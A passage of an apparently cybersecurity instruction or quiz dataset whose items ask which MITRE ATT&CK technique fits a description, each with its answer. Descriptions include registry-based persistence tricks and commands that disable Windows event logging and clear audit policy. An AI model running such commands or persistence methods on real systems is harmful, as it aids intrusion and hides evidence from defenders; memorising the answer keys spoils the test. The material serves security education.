      "question": "Answer which mitre technique is related to the description: Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost. Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support Proxy, including from residential proxy services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
      "options": "A. Supply Chain Compromise: Compromise Software Dependencies and Development Tools, B. Acquire Infrastructure, C. Compromise Accounts: Cloud Accounts, D. Account Access Removal",
      "choice": "B. Acquire Infrastructure",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).\nA. Compromise Accounts: Social Media Accounts, B. Cloud Service Dashboard, C. Virtualization/Sandbox Evasion: System Checks, D. Modify System Image: Downgrade System Image",
    "context": "",
    "output": "A. Compromise Accounts: Social Media Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).",
      "options": "A. Compromise Accounts: Social Media Accounts, B. Cloud Service Dashboard, C. Virtualization/Sandbox Evasion: System Checks, D. Modify System Image: Downgrade System Image",
      "choice": "A. Compromise Accounts: Social Media Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.\n\nA. Traffic Signaling: Socket Filters, B. Access Token Manipulation, C. Process Injection, D. Valid Accounts: Default Accounts\nAnswer:",
    "context": "",
    "output": "D. Valid Accounts: Default Accounts",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\n\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.",
      "options": "A. Traffic Signaling: Socket Filters, B. Access Token Manipulation, C. Process Injection, D. Valid Accounts: Default Accounts",
      "choice": "D. Valid Accounts: Default Accounts",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.\n\nA. Compromise Accounts: Social Media Accounts, B. Gather Victim Network Information: Network Security Appliances, C. Compromise Infrastructure: Serverless, D. File and Directory Discovery\nAnswer:",
    "context": "",
    "output": "D. File and Directory Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "options": "A. Compromise Accounts: Social Media Accounts, B. Gather Victim Network Information: Network Security Appliances, C. Compromise Infrastructure: Serverless, D. File and Directory Discovery",
      "choice": "D. File and Directory Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup. This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot. \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nA. Inter-Process Communication: Dynamic Data Exchange, B. Proxy: Multi-hop Proxy, C. Boot or Logon Autostart Execution: Port Monitors, D. Account Discovery: Domain Account\nA:",
    "context": "",
    "output": "C. Boot or Logon Autostart Execution: Port Monitors",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup. This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot. \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port",
      "options": "A. Inter-Process Communication: Dynamic Data Exchange, B. Proxy: Multi-hop Proxy, C. Boot or Logon Autostart Execution: Port Monitors, D. Account Discovery: Domain Account",
      "choice": "C. Boot or Logon Autostart Execution: Port Monitors",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).\n\nA. Acquire Infrastructure, B. Cloud Storage Object Discovery, C. Remote System Discovery, D. Obfuscated Files or Information: Steganography\nAnswer:",
    "context": "",
    "output": "C. Remote System Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  Ping or <code>net view</code> using Net.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local Arp cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage Network Device CLI commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).",
      "options": "A. Acquire Infrastructure, B. Cloud Storage Object Discovery, C. Remote System Discovery, D. Obfuscated Files or Information: Steganography",
      "choice": "C. Remote System Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship).\n\nA. User Execution, B. Scheduled Task/Job: Scheduled Task, C. Gather Victim Org Information, D. Boot or Logon Initialization Scripts\nAnswer:",
    "context": "",
    "output": "C. Gather Victim Org Information",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Phishing or Trusted Relationship).",
      "options": "A. User Execution, B. Scheduled Task/Job: Scheduled Task, C. Gather Victim Org Information, D. Boot or Logon Initialization Scripts",
      "choice": "C. Gather Victim Org Information",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.\nA. Credentials from Password Stores: Windows Credential Manager, B. Traffic Signaling: Socket Filters, C. Pre-OS Boot, D. Command and Scripting Interpreter: AppleScript",
    "context": "",
    "output": "B. Traffic Signaling: Socket Filters",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria. Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with Protocol Tunneling.\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
      "options": "A. Credentials from Password Stores: Windows Credential Manager, B. Traffic Signaling: Socket Filters, C. Pre-OS Boot, D. Command and Scripting Interpreter: AppleScript",
      "choice": "B. Traffic Signaling: Socket Filters",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.\n\nPossible answers:\nA. Boot or Logon Autostart Execution: Time Providers, B. Input Capture: Credential API Hooking, C. Phishing for Information: Spearphishing Link, D. Boot or Logon Autostart Execution: Shortcut Modification",
    "context": "",
    "output": "A. Boot or Logon Autostart Execution: Time Providers",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.",
      "options": "A. Boot or Logon Autostart Execution: Time Providers, B. Input Capture: Credential API Hooking, C. Phishing for Information: Spearphishing Link, D. Boot or Logon Autostart Execution: Shortcut Modification",
      "choice": "A. Boot or Logon Autostart Execution: Time Providers",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.\n\nOptions:\nA. Boot or Logon Autostart Execution: Authentication Package, B. Adversary-in-the-Middle: ARP Cache Poisoning, C. Hide Artifacts: VBA Stomping, D. Gather Victim Org Information: Identify Roles",
    "context": "",
    "output": "A. Boot or Logon Autostart Execution: Authentication Package",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",
      "options": "A. Boot or Logon Autostart Execution: Authentication Package, B. Adversary-in-the-Middle: ARP Cache Poisoning, C. Hide Artifacts: VBA Stomping, D. Gather Victim Org Information: Identify Roles",
      "choice": "A. Boot or Logon Autostart Execution: Authentication Package",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain. \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix. In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.\n\nA. Compromise Accounts, B. Obtain Capabilities: Malware, C. Hide Artifacts: Hidden Files and Directories, D. Account Discovery: Cloud Account\nAnswer:",
    "context": "",
    "output": "D. Account Discovery: Cloud Account",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.\n\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365. The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain. \n\nThe AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix. In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.",
      "options": "A. Compromise Accounts, B. Obtain Capabilities: Malware, C. Hide Artifacts: Hidden Files and Directories, D. Account Discovery: Cloud Account",
      "choice": "D. Account Discovery: Cloud Account",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment) \n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server \n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"\nA. Event Triggered Execution: Netsh Helper DLL, B. Indirect Command Execution, C. Peripheral Device Discovery, D. Content Injection",
    "context": "",
    "output": "D. Content Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment) \n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server \n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"",
      "options": "A. Event Triggered Execution: Netsh Helper DLL, B. Indirect Command Execution, C. Peripheral Device Discovery, D. Content Injection",
      "choice": "D. Content Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.\n\nTo help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.\n\nA. Adversary-in-the-Middle, B. Stage Capabilities: SEO Poisoning, C. Boot or Logon Initialization Scripts: Login Hook, D. Direct Volume Access\nA:",
    "context": "",
    "output": "B. Stage Capabilities: SEO Poisoning",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.\n\nTo help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.",
      "options": "A. Adversary-in-the-Middle, B. Stage Capabilities: SEO Poisoning, C. Boot or Logon Initialization Scripts: Login Hook, D. Direct Volume Access",
      "choice": "B. Stage Capabilities: SEO Poisoning",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings. <code>auditpol.exe</code> may also be used to set audit policies.\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>). Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.\n\nA. Cloud Administration Command, B. Impair Defenses: Disable Windows Event Logging, C. Endpoint Denial of Service: Service Exhaustion Flood, D. Exploitation of Remote Services\nA:",
    "context": "",
    "output": "B. Impair Defenses: Disable Windows Event Logging",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings. <code>auditpol.exe</code> may also be used to set audit policies.\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>). Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and 